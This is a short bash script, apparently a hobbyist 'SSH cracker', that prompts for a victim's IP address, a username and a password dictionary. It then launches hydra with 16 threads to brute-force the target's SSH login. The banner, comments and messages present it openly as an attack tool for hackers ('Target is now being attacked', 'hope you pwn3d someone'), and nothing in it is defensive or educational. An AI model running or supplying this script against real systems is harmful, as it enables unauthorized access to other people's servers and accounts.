#!/bin/bash
clear
      echo
# Another one of my simple @ss scripts for all my fellow hackers
 echo
   echo
echo "                           +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+-+-+"
echo "                          |n|1|t|r|0|g|3|n |S|S|H|_|C|r|a|c|k|3|r|"
echo "                           +-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+-+-+-+-+"
   echo
       echo
echo "                                    Created by: n1tr0g3n"

echo "                     Website : www.n1tr0g3n.com || www.top-hat-sec.com"
     echo
echo "                                  <-----HackMiami.org ----->"
  echo
sleep 7
clear
     echo
 echo
echo
  echo
# This command reads the Ip address of the vixtim
echo " Enter the IP address of the connection using SSH you would like to attack Example: 192.168.0.18"
read -e VIP
 clear
     echo
echo
    echo
echo
# This command reads the user name of the victim
echo "           Enter the User name of the victim you would like to attack Example: root "
read -e VICTIM
clear
   echo
echo
   echo
echo
# This command reads the location of the dictionary file you are using for the attack
echo "Enter the loaction of your dictionary file used for this attack Example: /root/Desktop/pass.txt "
read -e DICT
   echo
echo
       echo
echo
# This is the output of all instructions thrown into hydra to brute force the SSH password
echo
  echo
echo
echo "                          Target is now being attacked biotch!"
  echo
   echo
echo
  echo
hydra -l $VICTIM -P $DICT -t 16 $VIP ssh
echo
  echo
echo
# This command is just stupid no use even being here : )
  echo "                      hope you pwn3d someone now get to work!"
sleep 8 
     echo
  echo
   echo
echo
   exit


